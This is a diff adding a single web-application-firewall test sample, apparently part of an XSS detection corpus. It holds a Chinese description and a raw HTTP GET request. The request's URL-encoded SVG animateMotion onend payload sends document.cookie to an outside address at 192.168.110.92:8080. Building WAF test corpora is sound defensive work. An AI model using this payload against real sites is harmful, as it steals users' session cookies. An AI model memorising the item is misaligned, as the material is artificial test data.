@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_animatemotion标签_onend事件-06506573
+# 攻击载荷利用了HTML中的animatemotion标签和onend属性，触发location.href向恶意地址发送cookie信息。当 svg 动画结束时触发
+GET /?id=%3Csvg%3E%3Cpath%3E%3CanimateMotion%20onend=%28location.href=%22http:%2F%2F192.168.110.92:8080%2Findex.jsp%3Fid=%22+document.cookie%29%20dur=1s%20repeatCount=1%3E&bid=hd_tag_m8mv268j HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv268j
+RM-PRO-Token: 22fb551ab0a1af6a122da720ca4d6b2d
+RM-PRO-Time: 1742808555287
+User-Agent: curl/7.83.1
+
